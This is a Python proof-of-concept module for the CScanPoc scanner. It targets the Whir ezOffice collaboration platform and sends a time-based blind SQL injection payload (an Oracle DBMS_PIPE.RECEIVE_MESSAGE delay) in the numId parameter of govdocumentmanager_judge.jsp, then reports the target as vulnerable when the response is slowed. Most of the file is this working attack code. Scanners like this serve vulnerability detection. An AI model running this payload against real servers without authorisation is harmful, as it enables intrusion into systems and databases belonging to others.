# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Whir_0012'  # 平台漏洞编号，留空
    name = '万户ezOffice协同办公管理平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-12'  # 漏洞公布时间
    desc = '''
        万户软件是一个坚持网络风格是最大限度提升软件健壮性的一种有效手段，因为这样一来，决定应用并发数的并不是软件平台本身，而是硬件和网络速度；也就是说，从理论上讲，类似万户协同ezOFFICE这样的软件平台没有严格的并发数限制。
       万户ezOffice协同办公管理平台 /defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp页面未做过滤，导致SQL注入。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a7cf5999-ddd5-4b9f-86bd-fa65dac026d4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload_normal = "/defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp?numId=1"
            payload_bug = "/defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp?numId=1%20AND%203902=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(75)||CHR(106)||CHR(82),7)"
            start_normal = time.time()
            target_normal = self.target + payload_normal
            code1, head, body, errcode, _url = hh.http(target_normal)
            end_normal = time.time()
            times_normal = end_normal - start_normal

            start_bug = time.time()
            target_bug = self.target + payload_bug
            code2, head, body, errcode, _url = hh.http(target_bug)
            end_bug = time.time()
            times_bug = end_bug - start_bug

            if code1 == 200 and code2 == 200 and times_bug-times_normal > 6:
                #security_hole('This ezOFFICE has Vulnerability!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
